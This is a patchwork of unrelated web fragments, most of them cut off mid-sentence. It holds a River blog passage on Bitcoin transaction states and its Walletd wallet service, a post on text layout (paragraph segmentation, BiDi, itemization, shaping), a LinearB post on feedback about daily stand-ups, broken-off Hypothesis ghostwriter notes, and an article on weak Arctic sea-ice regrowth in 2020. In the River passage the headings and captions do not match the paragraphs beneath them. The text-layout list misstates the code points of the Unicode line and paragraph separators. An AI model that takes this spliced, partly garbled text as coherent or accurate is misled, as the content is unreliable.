Confirmation</strong></p><figure><img src="https://blog.river.com/content/images/2020/10/image-3.png" alt=""><figcaption>Transaction Confirmation</figcaption></figure><p><strong>Transaction Rejection</strong></p><p>A transaction is confirmed in a block. Due to the risks of block reorganization, River does not consider the transaction to be in a final confirmed state until the confirmed block has a certain depth (e.g. 6 blocks).</p><figure><img src="https://blog.river.com/content/images/2020/10/image-4.png" alt=""><figcaption>Transaction Rejection</figcaption></figure><p><strong>Transaction Un-Confirmation</strong></p><p>A transaction can be rejected for a number of reasons. In this example, the transaction is evicted from the mempool. Though the transaction can appear in a block at a later time, we mark the transaction as rejected. A double-spend is another form of transaction rejection that can occur.<br></p><figure><img src="https://blog.river.com/content/images/2020/10/image-5.png" alt=""><figcaption>Transaction Un-Confirmation</figcaption></figure><p>A transaction can be unconfirmed during a block reorganization. When this happens, the transaction is no longer in a block and the transaction lives in the mempool until a new valid block can be found. This particular state can be short-lived, or lead to transaction rejection should a double-spend occur.</p><p>Walletd is a service with many wallets that each have their own set of scripts and UTXOs. Each wallet is defined by a wallet descriptor that creates the scope and script semantics that the wallet is expected to follow. Walletd uses an interface to communicate with different signers and does not contain any key material. As a result, the service can only maintain watch-only wallets. Avoiding key material inside the Walletd process allows us to have a diverse set of signers isolated by hardware and software.</p><p>At the root of each wallet is the <a href="https://github.com/bitcoin/bitcoin/blob/master/doc/descriptors.md">Output Script Descriptor </a>language, authored by Pieter Wuille, which is also used in the Bitcoin Core wallet. The descriptor language helps us describe wallets in a maintainable and expressive way that is interoperable with other wallet software. Our <a href="https://bitcoinops.org/en/river-descriptors-psbt/">Field Report</a> with Bitcoin Optech goes into further detail on the rationale behind River’s choice to use descriptors. With a wallet descriptor, Walletd can generate the appropriate scripts and addresses. <br></p><figure><img src="https://blog.river.com/content/images/2020/10/image-6.png" alt="" srcset="https://blog.river.com/content/images/size/w600/2020/10/image-6.png 600w, https://blog.river.com/content/images/size/w1000/2020/10/image-6.png 1000w, https://blog.river.com/content/images/2020/10/image-6.png 1198w" sizes="(min-width: 720px) 720px"><figcaption>wallet descriptor</figcaption></figure><p>Descriptors ensure interoperability and reduce the complexity for creating new wallets. Before this standard, proprietary methods were used to pass the information for what constitutes a wallet. With Walletd, there is a straightforward API method that can be reduced to providing a single descriptor.</p><p>Walletd is designed to scale to millions of wallets, as each wallet will have different use-cases. In our enterprise wallet, we maintain visibility of cold wallets and hot wallets. Our cold wallets are bound to multi-signature P2WSH script generation while our hot wallets use the highly available P2WPKH script. In addition to differing script semantics, each wallet has different policies with regards to spend eligibility and other properties. A hot wallet servicing withdrawals will have different policies than a wallet responsible for creating funding transactions on the Lightning Network.</p><p>Upon detection of a transaction, Walletd can associate one of the outputs’ <a href="https://river.com/learn/terms/s/scriptpubkey/">scriptPubKeys</a> with a script belonging to a wallet descriptor. A scriptPubKey is the locking script that contains the semantics on how to spend Bitcoin. When processing a transaction, Walletd loops through each output in a transaction and checks its set of scripts for any matches. On a match, the output is a deposit to one of the wallets in Walletd. The state machine notices the new UTXO associated with the script and emits balance update event messages to any Walletd consumers. </p><p>As soon as the UTXO satisfies our spending eligibility requirements, Walletd can create a transaction using the new outpoint. Throughout the transaction creation process, we use Partially Signed Bitcoin Transactions (PSBTs), a serialization standard for describing unsigned transactions proposed in BIP174. Adopting this standard reduces complexity and maintains interoperability with other wallets. Most …</p></div></section></article></div></div></div>

      <div>
        <article itemscope="" itemtype="http://schema.org/BlogPosting">

  

  <div itemprop="articleBody">
    <p>I love text layout, and have been working with it in one form or other for over 35 years. Yet, knowledge about it is quite arcane. I don’t believe there is a single place where it’s all properly written down. I have some explanation for that: while basic text layout is very important for UI, games, and other contexts, a lot of the “professional” needs around text layout are embedded in <em>much</em> more complicated systems such as Microsoft Word or a modern Web browser.</p>

<p>A complete account of text layout would be at least a small book. Since there’s no way I can write that now, this blog post is a small step towards that – in particular, an attempt to describe the “big picture,” using the conceptual framework of a “loose hierarchy.” Essentially, a text layout engine breaks the input into finer and finer grains, then reassembles the results into a text layout object suitable for drawing, measurement, and hit testing.</p>

<p>The main hierarchy is concerned with laying out the entire paragraph as a single line of text. Line breaking is also important, but has a separate, parallel hierarchy.</p>

<h2 id="the-main-text-layout-hierarchy">The main text layout hierarchy</h2>

<p>The hierarchy is: paragraph segmentation as the coarsest granularity, followed by rich text style and BiDi analysis, then itemization (coverage by font), then Unicode script, and shaping clusters as the finest.</p>

<p><img src="https://raphlinus.github.io/assets/layout_pyramid.svg" alt="diagram of layout hierarchy"></p>

<h3 id="paragraph-segmentation">Paragraph segmentation</h3>

<p>The coarsest, and also simplest, segmentation task is paragraph segmentation. Most of the time, paragraphs are simply separated by newline (U+000A) characters, though Unicode in its infinite wisdom specifies a number of code point sequences that function as paragraph separators in plain text:</p>

<ul>
  <li>U+000A LINE FEED</li>
  <li>U+000B VERTICAL TAB</li>
  <li>U+000C FORM FEED</li>
  <li>U+000D CARRIAGE RETURN</li>
  <li>U+000D U+000A (CR + LF)</li>
  <li>U+0085 NEXT LINE</li>
  <li>U+2008 LINE SEPARATOR</li>
  <li>U+2009 PARAGRAPH SEPARATOR</li>
</ul>

<p>In rich text, paragraphs are usually indicated through markup rather than special characters, for example <code>&lt;p&gt;</code> or <code>&lt;br&gt;</code> in HTML. But in this post, as in most text layout APIs, we’ll treat rich text as plain text + attribute spans.</p>

<h3 id="rich-text-style">Rich text style</h3>

<p>A paragraph of rich text may contain <em>spans</em> that can affect formatting. In particular, choice of font, font weight, italic or no, and a number of other attributes can affect text layout. Thus, each paragraph is typically broken into a some number of <em>style runs,</em> so that within a run the style is consistent.</p>

<p>Note that some style changes don’t <em>necessarily</em> affect text layout. A classic example is color. Firefox, rather famously, does <em>not</em> define segmentation boundaries here for color changes. If a color boundary cuts a ligature, it uses fancy graphics techiques to render parts of the ligature in different color. But this is a subtle refinement and I think not required for basic text rendering. For more details, see <a href="https://gankra.github.io/blah/text-hates-you/">Text Rendering Hates You</a>.</p>

<h3 id="bidirectional-analysis">Bidirectional analysis</h3>

<p>Completely separate from the style spans, a paragraph may in general contain both left-to-right and right-to-left text. The need for bidirectional (BiDi) text is certainly one of the things that makes text layout more complicated.</p>

<p>Fortunately, this part of the stack is defined by a standard (<a href="http://www.unicode.org/reports/tr9/">UAX #9</a>), and there are a number of good implementations. The interested reader is referred to <a href="https://www.w3.org/International/articles/inline-bidi-markup/uba-basics">Unicode Bidirectional Algorithm basics</a>. The key takeaway here is that BiDi analysis is done on the plain text of the entire paragraph, and the result is a sequence of <em>level runs,</em> where the level of each run defines whether it is LTR or RTL.</p>

<p>The level runs and the style runs are then merged, so that in subsequent stages each run is of a consistent style and directionality. As such, for the purpose of defining the hierarchy, the result of BiDi analysis could alternatively be considered an implicit or derived rich text span.</p>

<p>In addition to BiDi, which I consider a basic requirement, a more sophisticated text layout engine will also be able to handle vertical <a href="https://developer.mozilla.org/en-US/docs/Web/CSS/writing-mode">writing modes</a>, including mixed cases where short strings are horizontal within the vertical primary direction. Extremely sophisticated layout engines will also be able to handle ruby text and other ways of annotating the main text flow with intercalated strings. See <a href="https://www.w3.org/TR/jlreq/">Requirements for Japanese Text Layout</a> for many examples of sophisticated layout requirements; the scope of this blog post really is basic text layout of the kind needed in user interfaces.</p>

<h3 id="itemization-font-coverage">Itemization (font coverage)</h3>

<p>Itemization is the trickiest and least well specified part of the hierarchy. There is no standard for it, and no common implementation. Rather, each text layout engine deals with it in its own special way.</p>

<p>Essentially, the result of itemization is to choose a single concrete font for a run, from a <em>font collection.</em> Generally a font collection consists of a main font (selected by font name from system fonts, or loaded as a custom asset), backed by a <em>fallback stack,</em> which are usually system fonts, but thanks to <a href="https://www.google.com/get/noto/">Noto</a> it is possible to bundle a fallback font stack with an application, if you don’t mind spending a few hundred megabytes for the assets.</p>

<p>Why is it so tricky? A few reasons, which I’ll touch on.</p>

<p>First, it’s not so easy to determine whether a font can render a particular string of text. One reason is <a href="https://unicode.org/reports/tr15/">Unicode normalization</a>. For example, the string “é” can be encoded as U+00E9 (in NFC encoding) or as U+0065 U+0301 (in NFD encoding). Due to the principle of <a href="https://en.wikipedia.org/wiki/Unicode_equivalence">Unicode equivalence</a>, these should be rendered identically, but a font may have coverage for only one or the other in its <a href="https://docs.microsoft.com/en-us/typography/opentype/spec/cmap">Character to Glyph Index Mapping</a> (cmap) table. The shaping engine has all the Unicode logic to handle these cases.</p>

<p>Of course, realistic fonts with Latin coverage will have both of these particular sequences covered in the cmap table, but edge cases certainly do happen, both in extended Latin ranges, and other scripts such as Hangul, which has complex normalization rules (thanks in part to a Korean standard for normalization which is somewhat at odds with Unicode). It’s worth noting that <a href="https://devblogs.microsoft.com/oldnewthing/20201009-00/?p=104351">DirectWrite gets Hangul normalization quite wrong</a>.</p>

<p>I believe a similar situation exists with the Arabic presentation forms; see <a href="https://www.arabeyes.org/Developing_Arabic_fonts">Developing Arabic fonts</a> for more detail on that.</p>

<p>Because of these tricky normalization and presentation issues, the most robust way to determine whether a font can render a string is to try it. This is how LibreOffice has worked for a while, and in 2015 <a href="https://lists.freedesktop.org/archives/harfbuzz/2015-October/005168.html">Chromium followed</a>. See also <a href="https://www.chromium.org/teams/layout-team/eliminating-simple-text">Eliminating Simple Text</a> for more background on the Chromium text layout changes.</p>

<p><em>Another</em> whole class of complexity is emoji. A lot of emoji can be rendered with either <a href="https://en.wikipedia.org/wiki/Emoji#Emoji_versus_text_presentation">text or emoji presentation</a>, and there are no hard and fast rules to pick one or the other. Generally the text presentation is in a symbol font, and the emoji presentation is in a separate color font. A particularly tough example is the smiling emoji, which began its encoding life as 0x01 in <a href="https://en.wikipedia.org/wiki/Code_page_437">Code page 437</a>, the standard 8-bit character encoding of the original IBM PC, and is now U+263A in Unicode. However, the suggested default presentation is text, which won’t do in a world which expects color. Apple on iOS unilaterally chose an emoji presentation, so many text stacks follow Apple’s lead. (Incidentally, the most robust way to encode such emoji is to append a <a href="https://en.wikipedia.org/wiki/Variation_Selectors_(Unicode_block)">variation selector</a> to pin down the presentation.)</p>

<p>Another source of complexity when trying to write a cross-platform text layout engine is querying the system fonts. See <a href="https://raphlinus.github.io/rust/skribo/text/2019/04/04/font-fallback.html">Font fallback deep dive</a> for more information about that.</p>

<p>I should note one thing, which might help people doing archaeology of legacy text stacks: it used to be pretty common for text layout to resolve “compatibility” forms such as NFKC and NFKD, and this can lead to various problems. But today it is more common to solve that particular problem by providing a font stack with <em>massive</em> Unicode coverage, including all the code points in the relevant compatibility ranges.</p>

<h3 id="script">Script</h3>

<p>The <em>shaping</em> of text, or the transformation of a sequence of code points into a sequence of positioned glyphs, depends on the script. Some scripts, such as Arabic and Devanagari, have extremely elaborate shaping rules, while others, such as Chinese, are a fairly straightforward mapping from code point into glyph. Latin is somewhere in the middle, starting with a straightforward mapping, but ligatures and kerning are also required for high quality text layout.</p>

<p>Determining script runs is reasonably straightforward - many characters have a Unicode script property which uniquely identifies which script they belong to. However, some characters, such as space, are “common,” so the assigned script just continues the previous run.</p>

<p>A simple example is “hello мир”. This string is broken into two script runs: “hello “ is <code>Latn</code>, and “мир” is <code>Cyrl</code>.</p>

<h3 id="shaping-cluster">Shaping (cluster)</h3>

<p>At this point, we have a run of constant style, font, direction, and script. It is ready for <em>shaping.</em> Shaping is a complicated process that converts a string (sequence of Unicode code points) into positioned glyphs. For the purpose of this blog post, we can generally treat it as a black box. Fortunately, a very high quality open source implementation exists, in the form of HarfBuzz.</p>

<p>We’re not <em>quite</em> done with segmentation, though, as shaping assigns substrings in the input to <a href="https://harfbuzz.github.io/clusters.html">clusters</a> of glyphs. The correspondence depends a lot on the font. In Latin, the string “fi” is often shaped to a single glyph (a ligature). For complex scripts such as Devanagari, a cluster is most often a syllable in the source text, and complex reordering can happen within the cluster.</p>

<p>Clusters are important for <em>hit testing,</em> or determining the correspondence between a physical cursor position in the text layout and the offset within the text. Generally, they can be ignored if the text will only be rendered, not edited (or selected).</p>

<p>Note that these shaping clusters are distinct from grapheme clusters. The “fi” example has two grapheme clusters but a single shaping cluster, so a grapheme cluster boundary can cut a shaping cluster. Since …</p></div></article></div></div></div>

<h2><strong>I’m in awe (thank you)&nbsp;</strong></h2>



<p>Two weeks ago I posted a blog about reinventing our daily stand-up meeting:&nbsp;</p>



<p><a href="https://linearb.io/blog/daily-stand-up-2-0-its-time-to-ditch-the-stand-up-from-1993/" target="_blank" rel="noreferrer noopener"><strong>Stand-up 2.0: It’s time to ditch the daily from 1993</strong></a></p>



<p>We don’t need a meeting to discuss individual status updates that could be a Slack message.</p>

<p>Let’s create a meeting focused on working together as a team to deliver our iteration on time.&nbsp;</p>



<p>I proposed a new framework that can be summarized into 3 key points:</p>



<ol><li>The stand-up should give everyone in the room value every day. Especially developers. Not just team leaders.<br></li><li>Team members show up to their daily already familiar with what their teammates did yesterday and what they have open today – aided by a simple Slack message or a <a href="https://linearb.io/demo" target="_blank" rel="noreferrer noopener">data-driven dashboard.</a><br></li><li>Instead of status, the meeting focuses on three topics:<br>– How am I blocked?<br>– What’s distracting me from my #1 priority?<br>– Will we ship on time?&nbsp;</li></ol>







<p>At the end of the post, I asked for feedback. And I got it. An incredible amount of it.&nbsp;</p>



<p>So let me first say <strong>thank you</strong>. I’m humbled that 100+ of you took the time to respond, give honest feedback, and share your own ideas.</p>

<p>I’m working on two more posts right now. One about the guidelines and technology we need to make the Stand-up 2.0 framework work. Another documenting the experiments our own dev team has been running at <a href="https://linearb.io/" target="_blank" rel="noreferrer noopener">LinearB</a> to see what they like and don’t like.&nbsp;</p>



<p>But all of your ideas have helped us evolve our thinking. So I figured I better share the feedback I received so we can continue the discussion together as a community.&nbsp;</p>







<h2><strong>Our community is ready for change</strong></h2>

<p>One of the main goals of Stand-up 2.0 is to make the daily more dev-centric.&nbsp;</p>



<hr>



<p><em>“The standups I’ve been a part of were either a total joke or just management getting a status update.” </em></p>



<p>-Jason, Software Engineer&nbsp;</p>







<p>Jason is not the first engineer I’ve heard this from over the years. I do think this is a widely held belief across our community. But you’ll see below it’s not quite that simple.&nbsp;</p>



<p>More than 100 people responded through chat, Linkedin, text, and email. I attempted to filter the most thoughtful and interesting comments representing the spectrum from excited and supportive to critical and apathetic.&nbsp;</p>







<p><strong>The feedback below is organized into 10 themes</strong> that emerged as I was processing everything:</p>







<h3><strong>1) Not everyone agrees</strong></h3>



<p>One CTO I’m friends with straight up said it was a bad idea.&nbsp;</p>



<hr>



<p><strong><em>“</em></strong><em>Not so sure on this one, Dan. Getting everyone to prep ahead of time is tough.” </em></p>



<p>-Jill, CTO</p>







<p>A few people told me the stand-up is fine the way it is.&nbsp;</p>



<hr>



<p><em>“Personally I actually like standup as it gives me a memory boost to start my day. Yesterday I worked on ABC today I am working on XYZ.” </em></p>



<p><em>-Arash, London&nbsp;</em></p>







<h3><strong>2) But, it feels like we’re on to something big</strong></h3>



<p>I was overwhelmed by the amount of positive, passionate feedback. Thanks for the encouragement, Everyone! It feels like the desire to change has been bubbling in our community for a while and now the dam is close to bursting.&nbsp;</p>

<p><em>“I found your article and </em>🤯💡🤯💡🤯💡<em> I’m intrigued as heck and would love to learn more.” </em></p>



<p>-Danielle, Front End Developer&nbsp;</p>



<hr>



<p><em>“I found the article really interesting – the problems are well described from the perspective of each persona and some of them should be resolved by your updated framework. We are facing similar concerns in my current company and we are progressively addressing them.”</em> </p>



<p>-Julien, Software Engineering Manager&nbsp;</p>



<hr>



<p><em>“Dan, I love the blog about standups – you’re totally right. Why are we still asking about status updates? This makes no sense.” </em></p>



<p>-Robert, VP Software Development</p>

<p>Wow, Harry. I assume the crying is good?&nbsp;&nbsp;😭</p>



<p>It says a lot about our community that so many are open to such a high degree of change for a ceremony so embedded in our process. Continuous improvement is part of our agile mindset but that doesn’t mean change isn’t hard. When something works for a long time, it’s easy to get comfortable.&nbsp;</p>



<p>As one developer points out:&nbsp;</p>



<hr>



<p><em>“The theory behind agile/scrum is good but not perfect for everyone. It needs some updating. Frankly, the agile community looks like a bunch of asshats with how they argue so much.” </em></p>



<p>-Danielle, Front End Developer&nbsp;</p>







<p>You’ll get no argument from me, Danielle 🙂&nbsp;</p>



<p>Pain is the catalyst for change. And clearly here, we’ve struck a nerve.&nbsp;</p>

<h3><strong>3) Some teams are already post stand-up 1.0</strong></h3>



<figure><img src="https://linearb.io/wp-content/uploads/2020/06/quote_9-1024x365.png" alt="" srcset="https://linearb.io/wp-content/uploads/2020/06/quote_9-1024x365.png 1024w, https://linearb.io/wp-content/uploads/2020/06/quote_9-300x107.png 300w, https://linearb.io/wp-content/uploads/2020/06/quote_9-768x274.png 768w, https://linearb.io/wp-content/uploads/2020/06/quote_9-1536x548.png 1536w, https://linearb.io/wp-content/uploads/2020/06/quote_9.png 1700w" sizes="(max-width: 1024px) 100vw, 1024px"></figure>



<hr>



<p><em>“In a truly high performing team I’d replace standup altogether with a nice coffee and a croissant.” </em></p>



<p>-Pm_me_your_amphibian</p>



<hr>



<p><em>“We do weekly stand-ups and ad-hoc meetings when needed. And then we just share a Slack update at a designated time each morning.” </em></p>



<p>– Felix, VP Engineering&nbsp;</p>



<hr>



<p><em>“COVID forced us to type up our stand up into a chat group each morning. It was the best thing that could have happened. Now we have a written commitment from everyone and as the boss, I have an instant snapshot of what everyone is doing. The team is loving the extra time in their day.” </em></p>



<p>-Ganzibai, Dev Team Lead&nbsp;</p>



<hr>



<p><em>“I have a completely remote team (pre-covid). We use Jira, Slack, and Github. We’ve been doing weekly stand-ups and just use Slack to request an ad-hoc meeting if there is an impediment that arises before the standup.” </em></p>



<p>-Samwheat90</p>







<p>I’m fascinated by this! I had honestly never heard of scrum teams not holding a daily stand-up meeting.&nbsp;</p>



<p>I have a few takeaways from the comments above:</p>



<ul><li>The maturity of your team matters. If you’re forming, storming or norming, you probably need more mechanisms to talk to each other – like meetings. If your team is performing, I can see how eliminating the daily meeting (replaced by a detailed Slack message or some kind of dashboard) could work.<br></li><li>Whether you hold a meeting or not, writing down your commitment makes a lot of sense. It can organize everyone and increase accountability. Again, especially if your team is still learning to work with each other.<br></li><li>Should the daily stand-up meeting actually be weekly?&nbsp;</li></ul>







<h3><strong>4) Some people had a lot to say&nbsp;</strong></h3>



<p>I received several long emails. I couldn’t include all of them but thanks to everyone who took the time to share their thoughts in great detail.</p>



<figure><img src="https://linearb.io/wp-content/uploads/2020/06/quote_3-1024x386.png" alt="" srcset="https://linearb.io/wp-content/uploads/2020/06/quote_3-1024x386.png 1024w, https://linearb.io/wp-content/uploads/2020/06/quote_3-300x113.png 300w, https://linearb.io/wp-content/uploads/2020/06/quote_3-768x289.png 768w, https://linearb.io/wp-content/uploads/2020/06/quote_3-1536x578.png 1536w, https://linearb.io/wp-content/uploads/2020/06/quote_3.png 1700w" sizes="(max-width: 1024px) 100vw, 1024px"></figure>



<hr>



<p><em>“I wrote a response to your article online, then I realized it got a little long and the character limit is 600. I figured since I’d written it I’d email it to you directly.”</em> </p>



<p>-Ben, Program Manager&nbsp;</p>







<p>I’ll summarize Ben’s email for you:&nbsp;</p>



<p><strong>The stand-up is all about communication.</strong> <em>“It sprang from a recognition that developers are typically awful at communication and much prefer to silo themselves and deep dive into code or spin their wheels on a problem in silence instead of announcing when they’ve completed a feature someone else was waiting on or are looking to pick up their next piece of work.”</em></p>



<p><strong>The stand-up is not a status update.</strong><em> “The objective is to solve the inherent lack of communication between the team by providing a forum that allows whole one-off team broadcast instead of multiple singular point to point messages between team members that isolate everyone else.”</em></p>



<p><strong>It takes a lot of discipline to make stand-up 1.0 work.</strong> <em>“The examples you listed as problems are real issues, but they’re not process-based. You’re spending longer in your stand up because your ticketing system isn’t up to date, you feel you don’t know if you’re going to make the sprint goal, your product owners need to ask for updates – all of these can be generalized as a lack of communication coming from your developers.”</em>&nbsp;</p>



<p><strong>In summary… </strong>Ben is saying that if everyone did their job by updating Jira tickets, attending the meeting on time every day, staying within their allotted two minutes and openly communicating when they need help, we wouldn’t need to change the stand-up framework.&nbsp;</p>



<p>I don’t know Ben but I like to think of him as an optimist 🙂 He’s arguing for how it should be. He believes that people are capable of better communication and a higher level of accountability.&nbsp;</p>



<p>I believe this too. But I also accept that different people have different strengths. Not everyone is comfortable speaking up and asking for help. And the entire industry struggles with updating Jira. So, call me a realist, but I think we need to accept how it is and try to make it better.&nbsp;</p>



<p>More importantly, even in elite teams where there is a high level of communication and accountability, I still think we can still elevate the stand-up and use it as a forum to talk about things that are more central to delivering a high-quality iteration on time.&nbsp;</p>







<h3><strong>5) There were a lot of ideas for Stand-up 2.1</strong></h3>

<p><em>“I’d get rid of the round-robin “3 questions” that many people seem so attached to. I have never worked in a team where that is a valuable format for a standup. Walking the board keeps people focussed on the sprint goal and the tasks in hand.” </em></p>



<p>-Pm_me_your_amphibian</p>

<p><em>“My latest project team focused on answering the questions with regard to the current Sprint goal: ‘What did I achieve yesterday in order to reach the Sprint goal?’, ‘What do I plan to do today to bring us closer to the Sprint goal?’, ‘Do I anticipate something that could get in my …</em></p></div></div></div>

<p>Writing tests with Hypothesis frees you from the tedium of deciding on and
writing out specific inputs to test.  Now, the <code><span>hypothesis.extra.ghostwriter</span></code>
module can write your test functions for you too!</p>
<p>The idea is to provide <strong>an easy way to start</strong> property-based testing,
<strong>and a seamless transition</strong> to more complex test code - because ghostwritten
tests are source code that you could have written for yourself.</p>
<p>So just pick a function you’d like tested, and feed it to one of the functions
below or <a data-doc="extras" data-docpath="/extras.html" data-project="hypothesis" data-section="hypothesis-cli" data-version="latest" href="https://hypothesis.readthedocs.io/en/latest/extras.html#hypothesis-cli"><span>our command-line interface</span></a> <strong>hypothesis write -h</strong>!
They follow imports, use but do not require type annotations, and generally
do their best to write you a useful test.</p>
<div>
<p>Note</p>
<p>The ghostwriter requires <a href="https://pypi.org/project/black">black</a>, but the generated code has no
dependencies beyond Hypothesis itself.</p>

<p>Note</p>
<p>Legal questions?  While the ghostwriter fragments and logic is under the
MPL-2.0 license like the rest of Hypothesis, the <em>output</em> from the ghostwriter
is made available under the <a href="https://creativecommons.org/share-your-work/public-domain/cc0/">Creative Commons Zero (CC0)</a>

<p>Note that it includes all the required imports.
Because the <code><span>pattern</span></code> parameter doesn’t have annotations or a default argument,
you’ll need to specify a strategy - for example <a data-doc="data" data-docpath="/data.html" data-project="hypothesis" data-section="hypothesis.strategies.text" data-version="latest" href="https://hypothesis.readthedocs.io/en/latest/data.html#hypothesis.strategies.text" title="hypothesis.strategies.text"><code><span>text()</span></code></a>

<p><strong>Arctic sea ice melt season usually lasts from March till September. After reaching the minimum extent in September, sea ice starts to grow back in October. But this year, the growth is much slower than last year, with almost no growth in some places. How did this unusual situation happen and can it mean something for the weather towards Winter 2020/2021?</strong><br>
&nbsp;</p>
<h5><span><strong>THE ARCTIC ICE GROWTH</strong></span></h5>
<p>The Arctic sea ice seasonal cycle can be seen in the image below from the Arctic-ROOS system. It shows the Arctic sea ice extent change over a year. The melt season usually starts in March, after the peak ice extent is reached, lasting all the way to September. The graph shows the last few years of data, where we can see the 2020 Arctic ice extent was second-lowest, only behind 2012, which still holds the record for the lowest ice extent since measurements began.</p>

<p>But comparing 2012 and 2020, we can see that this year we are also setting a new record, as the Arctic sea ice is not recovering as expected. The sea ice is refreezing back, but at a much slower rate than normal, meaning that some areas are severely falling behind.</p>

<p>That is even more evident when we look at the comparison of all the years since the active satellite observations began in 1979. This year we observed the second-lowest Arctic sea ice extent on record. But because of the unusually low ice growth in October, the current ice extent is now the lowest for any October in the past 41 years.</p>

<p>Comparing the minimum extent dates for the past 17 years also shows the 2020 minimum to be second lowest, trailing only the grand minimum of 2012. Graphic provided by <a href="https://sites.uci.edu/zlabe/graduate-research/">Zachary Labe</a>.</p>

<p>Comparing the years by the current date, we are well the lowest for this time of year. That is also evident by the second image, which shows the sea ice anomaly, compared to the long-term average. It shows the 2020 (red area) ice extent anomaly to continue to increase, while in the previous years (white lines), the anomaly already started to decrease by this point.</p>

<p>The analysis image by the National Snow and Ice Data Center (NSIDC) below, shows the current ice concentration and the average/normal long term extent in orange lines. Those orange lines show how far the sea ice should be reaching at this point in time, revealing a huge ice deficit.</p>

<p>Growth has obviously begun since mid-September, but the rate was rather weak and is not increasing with time, evident by the recent daily increase rate on the image below. At this point, the daily growth should slowly increase over time, but we can see the daily growth area is not increasing and has rather been almost decreasing over time. The second image shows the October growth compared to previous years, where 2020 is severely trailing behind</p>

<p>Images below show the current sea ice extent and thickness. We can see that the thickness shows a larger area than the concentration. That is because the concentration shows only the sea ice above 15% concentration. Anything below that means the ice is just too fractured and not compact enough.</p>
<p>So the sea ice thickness image reveals that there is thinner uncompacted ice around the edges, which falls below the 15% concentration threshold. This is usually normal because new sea ice is just starting to form on the edges and takes time to get more compact. But this year the ice is not compacting so fast, and we are now going to look at what is behind this unusual event.</p>

<h5><span><strong>THE VAST ARCTIC OCEAN</strong></span></h5>
<p>The Arctic region is in fact entirely an ocean and has no large-scale landmass. It is the smallest and shallowest of the world’s five major oceans, and also the coldest. It is also the only ocean smaller than the largest country in the world by area, Russia.</p>
<p>The image below shows the Arctic ocean, as it would look without water, revealing a very complex underwater terrain. To understand the current unusual sea ice anomalies, we need to understand the ocean where all the ice floats on. More specifically, we need to understand the state of the ocean in its eastern region, in the Kara Sea, Siberian Sea, and the Laptev Sea. The image below shows these regions in the Arctic Ocean, found on the side opposite to Greenland. The graphic is from one of the more recent Arctic Ocean <a href="https://www.researchgate.net/publication/314163132_New_constraints_on_Arctic_Ocean_Mn_stratigraphy_from_radiocarbon_dating_on_planktonic_foraminifera">studies</a>.</p>

<p>The image below is probably the most important one so far, as it shows the ocean surface temperature anomaly. It shows the ocean temperatures are currently well above normal around the entire Arctic ice sheet. Anomalies of over 2-3 degrees Celsius can be found across all the 3 critical ocean regions we mentioned above.</p>

<p>Also looking at the raw temperatures, we can see the eastern Arctic ocean is actually in positive surface temperatures, which means a low to zero chance of freezing over at this point. In normal conditions, almost the entire Arctic ocean should be at or below the freezing point – 0°C (black color) by the end of October.</p>

<p>When comparing the current ice concentration and thickness with the lowest ice extent in mid-September, we can see the growth on the edges. But towards Siberia, we can actually see a reduced concentration and reduced thickness (red colors). Ocean and air temperatures were not yet right to allow rapid refreeze towards Siberia at present time.</p>

<p>But temperature is not the only factor here. <span><strong>Ocean salinity</strong></span> also plays a big role in the production of ice. The saltier the water, the colder it needs to get for ice to form. Think of salt being used on the roads to prevent ice buildup.</p>
<p>The image below shows the Arctic ocean salinity, where we can see the fresher water in blue colors, and saltier waters in brownish hues. Transport of saltier water is obvious from the North Atlantic into the Arctic Ocean, specifically towards the eastern parts. Interestingly, we can see the dark colors around the coastal areas, which is very fresh water. That is the freshwater discharge from the Siberian rivers.</p>

<p>We produced a short but very cool high-resolution video animation, which shows the Arctic ocean salinity in the past 5 months. You can see the <span><strong>ocean circulation</strong></span>, <strong><span>ocean currents,</span></strong> and the <strong><span>saltier water transport</span></strong> from the North Atlantic. Also note the freshwater entering the Arctic from the Siberian side, as the rivers discharge into the ocean, and note the freshwater increase during Summer, as melting ice makes the surface waters fresher.</p>


<h5><span><strong>SEA ICE ACROSS REGIONS</strong></span></h5>
<p>Many regions have regained ice since the lowest point in mid-September. But as we have shown above, the east Arctic Ocean is unusually warm and prevents fast sea-ice expansion.</p>
<p>The image below shows the sea ice extent by various regions across the Arctic. While some regions normally start the freezing at a later date, there are 3 regions that stand out, as they should be much higher than they currently are. The <strong><span>Siberian Sea</span></strong> region, the <span><strong>Kara Sea</strong></span>, and the <span><strong>Laptev Sea</strong></span>. These are the regions that we have highlighted higher up in the article, which also face the biggest temperature anomalies.</p>

<p>Looking at the Siberian Arctic region, it is struggling to increase the ice extent. It is running really unusually low for this time of year, having just a few % of the normal sea ice extent expected for this date.</p>

<p>And of course, the Laptev Sea, which has been at record low levels for quite some time now. In the previous decade, the Laptev Sea has been entirely frozen over by this time of year, while this year it simply cannot lift off the ground.</p>

<p>But what is causing this unusual situation in the eastern Arctic Ocean? We have seen the ocean temperature anomalies and ocean salinity. But what has brought the Arctic Ocean into this state? Part of the answer lies in the Atmosphere, which is where we are heading next.<br>
&nbsp;</p>
<h5><span><strong>FROM THE OCEAN TO THE ATMOSPHERE</strong></span></h5>
<p>In the atmosphere, we usually always start with the temperatures. Looking at the January-September period, we can see that a hotspot has developed right over Siberia and the eastern Arctic Ocean. We can see a large area of temperatures 4-5°C above the long term average. We wrote about these <a href="https://www.severe-weather.eu/global-weather/arctic-circle-high-pressure-warming-fa/">Arctic heatwaves</a>, which were ongoing since Spring.</p>

<p>A closer look at the August-September period reveals an even stronger hotspot, now expanded further into the Arctic Ocean, as the sea ice melted and more open water was exposed to the warmer weather.</p>

<p>The reason behind this anomaly was a very specific pressure pattern. The October analysis so far, shows the high-pressure area dominating the Arctic region, while we can see a low-pressure system over the Siberian side.</p>

<p>Such a pattern creates a very unique transpolar airflow over the eastern Arctic Ocean. The image below shows the average low-level wind flow in October so far. We can see the air transport across the Arctic, as warmer air enters the Arctic from one side, and cooler air leaving out on the other side.</p>

<p>The past 10 days specifically, have seen anomalies in excess of 15°C across the Siberian Arctic ocean. This, together with the warmer ocean waters, has been a large ice growth inhibitor so far in October.</p>

<p>The forecast is not looking any better. The pressure pattern has now actually reversed, with lower pressure over the Arctic. But this will change the airflow direction, just bringing warmer air from another source region. The first image shows the pressure anomalies next weekend. The second image shows the wind direction and temperature anomalies, revealing a large scale warmer air transport into the Siberian Arctic.</p>

